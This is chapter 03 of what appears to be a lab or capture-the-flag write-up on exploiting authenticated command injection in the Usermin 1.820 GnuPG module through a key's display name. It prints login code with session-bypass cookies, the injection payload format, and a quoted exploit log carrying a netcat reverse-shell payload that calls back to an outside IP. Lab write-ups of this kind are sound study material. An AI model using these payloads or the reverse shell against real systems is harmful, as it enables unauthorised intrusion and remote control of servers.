# 03 — Usermin, the GnuPG module, and one unquoted string

The panel on 20000 is Usermin 1.820. The credentials from chapter 02 work on it. What turns a
mail-reading panel into code execution is a single line in the GnuPG module that pastes a key's
display name into a shell pipeline.

---

## 3.1 Logging in

The login form posts to `/session_login.cgi`. Two cookies matter: `redirect=1` stops Usermin from bouncing you to a "session expired" page,
and `testing=1` stops it from invalidating the session when the User-Agent changes between requests
— both are needed when a script, not a browser, is driving the session. EDB 50234 sets them on
every request:

```python
headers = {'Cookie': 'redirect=1; testing=1;', 'Referer': target}
login = session.post(target + "/session_login.cgi", headers=headers, verify=False,
                     data={"user": username, "pass": password})
```

The reliable "am I logged in" signal is not the HTTP status — the login page answers `200` whether
or not the credentials worked. It is whether the response contains the authenticated navigation.
`webmin_search.cgi` only appears once a session exists, and that is the exact check the exploit
makes before printing `[+] Login successfully`.

## 3.2 The module that matters

After login, the sidebar has the usual per-user modules: mail, files, cron, SSH keys, **GnuPG
Keys**. That last one is the target.

```
https://192.168.161.157:20000/gnupg/
```

Four CGI endpoints do the work:

| Endpoint | Purpose |
|---|---|
| `/gnupg/list_keys.cgi` | renders the keyring, one `edit_key.cgi?idx=N` link per key |
| `/gnupg/secret.cgi` | creates a new secret key from a `name` and `email` form field |
| `/gnupg/import.cgi` | imports an ASCII-armoured key (`mode=2` with a `text` field) |
| `/gnupg/edit_key.cgi?idx=N` | shows a key's details — and shells out to `gpg --fingerprint` |

The keyring on a fresh account is empty. That matters later: with no keys there is nothing to
trigger, so the exploit has to *create* one first.

## 3.3 EDB 50234 is an authenticated RCE

The public exploit is [EDB 50234](https://www.exploit-db.com/exploits/50234), *Usermin 1.820 — Remote
Code Execution (Authenticated)*, reworked by Numan Turle and Tunahan TEKEOĞLU. It does exactly three
things:

1. POSTs `name` and `email` to `/gnupg/secret.cgi`, with the payload hidden in `name`.
2. Reads `/gnupg/list_keys.cgi` and picks a key index out of the HTML.
3. Requests `/gnupg/edit_key.cgi?idx=N`.

Step 3 is the execution. In Usermin's `gnupg-lib.pl`, the function that prints a key's fingerprint
builds a shell pipeline:

```perl
open(GPG, "$gpgpath --fingerprint \"$_[0]->{'name'}->[0]\" 2>/dev/null |");
```

The key's display name — attacker-controlled since step 1 — is interpolated between double quotes
and handed to a shell. There is no escaping and no `list` form, so a name containing `";` closes the
quote, ends the `gpg` command, and starts a new one.

## 3.4 The payload shape

The name is spliced as `"...\"<NAME>\"..."`. To land a command, the name must close the quote,
terminate the statement, run, and then reopen a quote so the rest of the line stays syntactically
valid:

```text
NAME = ";id;echo "
```

Which produces:

```bash
gpg --fingerprint "";id;echo "" 2>/dev/null |
```

`id` runs. The trailing `echo ""` absorbs the remaining quote and the redirect. This is the wrapper
the exploit script applies for you:

```python
payload = 'id > /home/cassie/exec_test.txt 2>&1;'
name    = '";{}echo "'.format(payload)      # ->  ";id > ... 2>&1;echo "
```

> **The trailing semicolon is not optional.** The wrapper appends `echo "` immediately after your
> payload. A payload ending in `2>&1` becomes `2>&1echo "`, which `/bin/sh` rejects with
> `Bad fd number` before running anything. End every payload with `;`.

## 3.5 Who the command runs as

Usermin's `miniserv` runs each user's CGI as that user, not as root. So the injection is
**code execution as `cassie`**, confirmed by reading back the `id` output in chapter 04:

```text
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
```

That is the correct altitude for this box. There is no root-owned Webmin here to fall out of; the
panel is a per-user service, and the privilege boundary it crosses is "cassie can only read" →
"cassie can run commands". Root comes from the cron job in chapter 06.

## 3.6 The public exploit does not run as shipped

On this target the published script dies before it reaches step 3:

```text
[+] Target https://192.168.161.157:20000
[+] Login successfully
[+] Setup GnuPG
[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.158 1337 >/tmp/f;echo "', 'email': '1337@webmin.com'}
[+] Setup successful
[+] Fetching key list
Traceback (most recent call last):
  File "/home/kali/Desktop/exploit.py", line 73, in exploit
    last_gets_key = re.findall("edit_key.cgi\?(.*?)'", str(key_list.content))[-2]
IndexError: list index out of range
```

Two separate defects, and they interact:

1. **`[-2]` assumes at least two keys.** `re.findall` returns a list of matches; indexing `[-2]`
   throws the moment the keyring renders fewer than two `edit_key.cgi` links. On a fresh account
   with an empty keyring — or one where the create step failed — that list is empty.
2. **`"successfully"` is page boilerplate.** The script uses the presence of that word in the
   `secret.cgi` response as proof that the key was created. It appears on the page whether or not
   `gpg` produced anything, so `[+] Setup successful` is not evidence.

On this box the create step *does* work (`gpg` is older than 2.3, so it takes the workstation
key-generation path without a passphrase prompt), which means defect 1 was the blocker: the key
existed, but the index arithmetic crashed before the trigger request.

Chapter 04 covers the two ways out — a two-line patch to the published script, and the rewrite that
was actually used.

## 3.7 What chapter 03 established

- Valid session on Usermin 1.820 as `cassie`, using the FTP credentials.
- The GnuPG module is reachable and its four CGIs behave as the exploit expects.
- The sink is `open(GPG, "$gpgpath --fingerprint \"<name>\" 2>/dev/null |")` — command injection
  through the key display name.
- Execution context is `cassie` (uid 1000), not root.
- The published exploit needs a fix before it can reach the sink.
